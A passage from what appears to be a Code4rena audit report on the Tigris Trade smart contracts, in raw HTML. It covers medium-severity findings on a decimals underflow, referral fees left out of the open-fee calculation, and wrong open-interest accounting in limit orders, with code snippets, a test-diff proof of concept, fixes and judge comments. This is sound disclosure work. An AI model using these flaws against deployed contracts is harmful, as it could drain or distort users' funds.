class=\"grvsc-line\"><span class=\"grvsc-source\">args: [&quot;USDC&quot;, &quot;USDC&quot;, 24, deployer, ethers.utils.parseUnits(&quot;1000&quot;, 24)]</span></span></code></pre>\n<p>Then in <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/test/07.Trading.js\">07.Trading.js</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Opening and closing a position with tigUSD output</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Opening and closing a position with &lt;18 decimal token output</span></span></code></pre>\n<p>are going to fail with:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Error: VM Exception while processing transaction: reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)</span></span></code></pre>\n<h3 id=\"tools-used-13\" style=\"position:relative;\"><a href=\"#tools-used-13\" aria-label=\"tools used 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Update calculations in the contract to account for tokens with decimals higher than 18.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/533#issuecomment-1375985587\">TriHaz (Tigris Trade) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We are aware of that. We are not planning on adding any token that has more than 18 dec.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/533#issuecomment-1382251600\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to an underflow, the system in-scope can revert when using tokens with more than 18 decimals.</p>\n<p>Because of how scope was defined, I believe the finding to be valid, I believe a nofix is acceptable as long as the sponsor keeps in mind this risk.</p>\n<p>Because of the risk shown, I agree with Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-20-tradinginitiatemarketorder-allows-to-open-a-position-with-more-margin-than-expected-due-to-_handleopenfees-wrong-calculation-when-a-trade-is-referred\" style=\"position:relative;\"><a href=\"#m-20-tradinginitiatemarketorder-allows-to-open-a-position-with-more-margin-than-expected-due-to-_handleopenfees-wrong-calculation-when-a-trade-is-referred\" aria-label=\"m 20 tradinginitiatemarketorder allows to open a position with more margin than expected due to _handleopenfees wrong calculation when a trade is referred permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/542\">[M-20] Trading#initiateMarketOrder allows to open a position with more margin than expected due to _handleOpenFees wrong calculation when a trade is referred</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/542\">carlitox477</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/322\">koxuan</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178-L179\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178-L179</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738\">https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738</a></p>\n<p>When <code>initiateMarketOrder</code> is called, <code>_marginAfterFees</code> are calculated and then used to calculate <code>_positionSize</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_marginAfterFees</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">_handleOpenFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_marginAfterFees</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The problem is that <code>_handleOpenFees</code> does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected.</p>\n<h3 id=\"impact-12\" style=\"position:relative;\"><a href=\"#impact-12\" aria-label=\"impact 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>For a referred trade, <code>initiateMarketOrder</code> always opens a position greater than the one supposed, by allowing the use of more margin than the one expected.</p>\n<h3 id=\"proof-of-concept-30\" style=\"position:relative;\"><a href=\"#proof-of-concept-30\" aria-label=\"proof of concept 30 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The output of <code>_handleOpenFees</code> is <code>_feePaid</code>, which is calculated <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738\">once</a>, and it does not consider referralFees:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// No refferal fees are considered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">_feePaid</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_positionSize</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    * (</span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnFees</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">botFees</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// get total fee%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk5\">/ DIVISION_CONSTANT /</span><span class=\"mtk1\">/ </span><span class=\"mtk12\">divide</span><span class=\"mtk1\"> </span><span class=\"mtk12\">by</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100</span><span class=\"mtk1\">%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    + </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Then we can notice that, if the output of <code>_handleOpenFees</code> did not consider referral fees, neither would <code>\\_marginAfterFees</code> do:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_marginAfterFees</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_handleOpenFees</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_trader</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// @audit Then _positionSize would be greater than what is supposed to be, allowing to create a position greater than expected</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_marginAfterFees</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_tradeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation steps</h3>\n<p>Consider referral fees when <code>_feePaid</code> is calculated in <code>_handleOpenFees</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">// In _handleOpenFees function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _feePaid =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        _positionSize</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-       * (_fees.burnFees + _fees.botFees) // get total fee%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        / DIVISION_CONSTANT // divide by 100%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        + _daoFeesPaid;</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/542\">TriHaz (Tigris Trade) confirmed</a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/542#issuecomment-1382265541\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown an accounting issue in how fees are calculated, the refactoring is straightforward.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-21-executelimitorder-modifies-open-interest-with-a-wrong-position-value\" style=\"position:relative;\"><a href=\"#m-21-executelimitorder-modifies-open-interest-with-a-wrong-position-value\" aria-label=\"m 21 executelimitorder modifies open interest with a wrong position value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/576\">[M-21] <code>executeLimitOrder()</code> modifies open-interest with a wrong position value</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/576\">0xA5DF</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/437\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/431\">KingNFT</a>, and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/137\">HollaDieWaldfee</a></em></p>\n<p>The <code>PairsContract</code> registers the total long/short position that’s open for a pair of assets, whenever a new position is created, the total grows accordingly.</p>\n<p>However at <code>executeLimitOrder()</code> the position size that’s added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.</p>\n<h3 id=\"impact-13\" style=\"position:relative;\"><a href=\"#impact-13\" aria-label=\"impact 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).</p>\n<h3 id=\"proof-of-concept-31\" style=\"position:relative;\"><a href=\"#proof-of-concept-31\" aria-label=\"proof of concept 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/07.Trading.js b/test/07.Trading.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index ebe9948..dfb7f98 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/07.Trading.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/07.Trading.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -778,7 +778,7 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&quot;Creating and executing limit buy order, should have correct price and bot fees&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       // Create limit order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 0, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;100&quot;), 0, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther(&quot;20000&quot;), PermitData, owner.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -787,6 +787,9 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await network.provider.send(&quot;evm_increaseTime&quot;, [10]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       await network.provider.send(&quot;evm_mine&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let count = await position.getCount();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let id = count.toNumber() - 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       // Execute limit order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let PriceData = [node.address, 0, parseEther(&quot;10000&quot;), 10000000, 2000000000, false]; // 0.1% spread</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let message = ethers.utils.keccak256(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -798,8 +801,22 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let sig = await node.signMessage(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         Buffer.from(message.substring(2), &#39;hex&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      await trading.connect(user).executeLimitOrder(1, PriceData, sig);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let oi = await pairscontract.idToOi(0, stabletoken.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      expect(oi.longOi.toNumber()).to.equal(0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      console.log({oi, stable:stabletoken.address});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      await trading.connect(user).executeLimitOrder(id, PriceData, sig);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      let trade = await position.trades(id);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      console.log(trade);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      oi = await pairscontract.idToOi(0, stabletoken.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      console.log(oi);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect((await trading.openFees()).botFees).to.equal(2000000);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -807,6 +824,7 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let [,,,,price,,,,,,,] = await position.trades(1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(price).to.equal(parseEther(&quot;20020&quot;)); // Should have guaranteed execution price with spread</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     it(&quot;Creating and executing limit sell order, should have correct price and bot fees&quot;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       // Create limit order</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 0, false, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -1606,6 +1624,7 @@ describe(&quot;Trading&quot;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther(&quot;1.5&quot;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   });</span></span></span>\n<span 